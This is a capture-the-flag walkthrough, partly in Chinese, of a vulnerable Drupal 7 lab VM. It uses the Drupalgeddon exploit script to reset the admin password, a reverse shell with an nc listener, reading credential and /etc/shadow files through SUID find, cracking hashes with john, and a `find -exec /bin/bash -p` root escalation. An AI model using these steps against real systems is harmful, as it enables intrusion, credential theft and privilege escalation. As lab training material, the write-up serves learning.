1. Scanning network segment
    ```
    $ sudo netdiscover -i eth0
    ```
    ![image](https://hackmd.io/_uploads/Hk7QjjKvlg.png)
2. Scanning IP
    ```
    $ nmap -sV 192.168.163.133 
    ```
    ![image](https://hackmd.io/_uploads/HyksijYwll.png)
3. Checking the website
    ```
    $ curl http://192.168.163.133
    ```
    ![image](https://hackmd.io/_uploads/HknyweqPxx.png)
    Discovered a vulnerability called Drupal 7 
4. Copy script and download module to current directory
    ```
    $ cp /usr/share/exploitdb/exploits/php/webapps/34984.py .
    $ wget https://raw.githubusercontent.com/cvangysel/gitexd-drupalorg/master/drupalorg/drupalpass.py
    ```
    Execute attack script
    ```
    $ python2 34984.py http://192.168.163.133 admin admin
    ```
    ![image](https://hackmd.io/_uploads/rySYqg5vel.png)
    I created new username and password successfully!
    `admin/admin`
5. I found flag3 in comment column, it points out a typical Linux privilege escalation method
![image](https://hackmd.io/_uploads/Byx9sQ-9Pgx.png)
    * **Special PERMS**: Refers to special permissions, the most common of which is SUID (Set User ID). When a file has the SUID bit set, any user who executes it will execute it with the permissions of the file owner, rather than the executor's own permissions.
    * **FIND the passwd**: I think it means find command
    * **-exec that command**: This is a powerful option for the find command that allows you to execute another command for each file that find discovers
    * **get what's in the shadow**: The final purpose is reading `/etc/shadow` file, which saves the hash value of user's password
6. Find php filter option in modules column and check it
![image](https://hackmd.io/_uploads/rJ9jZ-qDxx.png)
Kali side starts monitoring
    ```
    $ nc -lvnp 4444
    ```
    Website -> Content -> Add content -> Basic Page
    Paste the reverse shell in body and save it
    ![image](https://hackmd.io/_uploads/SywVfb9Pll.png)
    Then I connected!
    ![image](https://hackmd.io/_uploads/H1pE7-qDgg.png)
7. Print flag1.txt
    ```
    $ cat flag1.txt
    Every good CMS needs a config file - and so do you.
    ```
    It gives me a hint - I need to read config file
8. Print the config file
    ```
    $ cat sites/default/settings.php
    ```
    Then I discover flag2 in this file
    ```
     /**
     *
     * flag2
     * Brute force and dictionary attacks aren't the
     * only ways to gain access (and you WILL need access).
     * What can you do with these credentials?
     *
     */
    ```
    It's telling me not to brute force and emphazing that I need to use **these credentials** to get some kind of **access**
    
    Credentials:
    ```
    $databases = array (
        'default' => 
        array ('default' => 
        array (
          'database' => 'drupaldb',
          'username' => 'dbuser',
          'password' => 'R0ck3t',
          'host' => 'localhost',
          'port' => '',
          'driver' => 'mysql',
          'prefix' => '',
        ),
      ),
    );
    ```
    Now I know the username and password. So I go to `/etc/passwd` to check whether there is a user named dbuser, but there is none...
    ```
    $ cat passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    Debian-exim:x:101:104::/var/spool/exim4:/bin/false
    statd:x:102:65534::/var/lib/nfs:/bin/false
    messagebus:x:103:107::/var/run/dbus:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
    flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
    ```
    I guess that set of credential is only for database. However, I discover another clue, there is an user named **flag4** over the button line
9. Let's back to flag3 clue-- **use `find` command**
    Find all files with `SUID` permissions
    ```
    $ find / -perm -u=s -type f 2>/dev/null
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
    /bin/umount
    /usr/bin/at
    /usr/bin/chsh
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/procmail
    /usr/bin/find
    /usr/sbin/exim4
    /usr/lib/pt_chown
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /sbin/mount.nfs
    ```
    It's exactly as the flag3 said, `find` command has `SUID` permission
    So I can use `find` to read `/etc/shadow` that are only readable by `root`
    ```
    $ find . -exec cat /etc/shadow \; -quit
    root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
    daemon:*:17946:0:99999:7:::
    bin:*:17946:0:99999:7:::
    sys:*:17946:0:99999:7:::
    sync:*:17946:0:99999:7:::
    games:*:17946:0:99999:7:::
    man:*:17946:0:99999:7:::
    lp:*:17946:0:99999:7:::
    mail:*:17946:0:99999:7:::
    news:*:17946:0:99999:7:::
    uucp:*:17946:0:99999:7:::
    proxy:*:17946:0:99999:7:::
    www-data:*:17946:0:99999:7:::
    backup:*:17946:0:99999:7:::
    list:*:17946:0:99999:7:::
    irc:*:17946:0:99999:7:::
    gnats:*:17946:0:99999:7:::
    nobody:*:17946:0:99999:7:::
    libuuid:!:17946:0:99999:7:::
    Debian-exim:!:17946:0:99999:7:::
    statd:*:17946:0:99999:7:::
    messagebus:*:17946:0:99999:7:::
    sshd:*:17946:0:99999:7:::
    mysql:!:17946:0:99999:7:::
    flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
    ```
10. Then we can start to crack hashes. First, store hash value of the entire line of root and flag4
    ```
    $ nano hash.txt
    ```
    Second, use `john` command to crack the hash
    ```
    $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
    ```
    I get password of `flag4`
    ```
    $ john --show hash.txt 
    flag4:orange:17946:0:99999:7:::
    1 password hash cracked, 0 left

    ```
11. Use ssh connect and sign in
    ```
    $ ssh flag4@192.168.163.133
    ```
    Find and print `flag4.txt`
    ```
    $ cat flag4.txt
    Can you use this same method to find or access the flag in root?

    Probably. But perhaps it's not that easy.  Or maybe it is?
    ```
    So I believe I can use `john` to crack the hash, but ther is still another way
    
12. Telling `find` to execute a shell (`bin/bash`) and quit `find`
    ```
    $ find . -exec /bin/bash -p \; -quit
    ```
    The key point is `-p`, which can tell shell **not to discard inherited valid user IDs** (`root`)
13. Check who am I and print the final flag
    ```
    # whoami
    root
    # cat thefinalflag.txt 
    Well done!!!!

    Hopefully you've enjoyed this and learned some new skills.

    You can let me know what you thought of this little journey
    by contacting me via Twitter - @DCAU7
    ```

---
## What is Drupal7?
* Vulnerability explain (CVE-2014-3704 "Drupalgeddon")
It's a kind of seriout **SQL Injection** which called Drupalgeddon.
    1.  **Reason**: Drupal 7 的核心資料庫處理功能中存在一個缺陷。當它處理一個包含陣列 (array) 的資料庫查詢時，沒有正確地清理陣列的「鍵名」(key)。
    2.  **Attack method**: 攻擊者可以製作一個 HTTP 請求，將惡意的 SQL 語句藏在傳送資料的「鍵名」中。當 Drupal 伺服器收到這個請求並嘗試處理它時，這些惡意的 SQL 語句就會被錯誤地拼接到原始的資料庫查詢指令中，並被資料庫執行。
    3.  **Vulnerability impact**: 由於攻擊者可以執行任意的 SQL 指令，他們可以對資料庫進行任何操作，例如讀取敏感資料、刪除內容，或者像剛剛所做的——**修改使用者帳號的密碼**。

### 成功登入的原因

`34984.py` 腳本正是利用了上述漏洞：

1.  **腳本目標**: 它的目標是向 Drupal 網站發送一個惡意請求。
2.  **注入的指令**: 腳本注入的 SQL 指令是一個 `UPDATE` 指令。它告訴資料庫去更新 `users` 資料表。
3.  **具體操作**:
    *   它找到使用者名稱為 `admin` 的那筆資料。
    *   它使用 `drupalpass.py` 模組計算出新密碼 `admin` 對應的 Drupal 加密雜湊值 (hash)。
    *   它將 `admin` 使用者的密碼欄位更新為這個新的雜湊值。

因此當使用 `admin` / `admin` 登入時，Drupal 將方才輸入的密碼 `admin` 進行雜湊運算，發現結果與資料庫中儲存的新雜湊值完全相符，於是就驗證成功，便可以管理員身分登入了。

簡單來說，剛剛沒有「破解」舊密碼，而是利用漏洞**直接設定了一個新密碼**。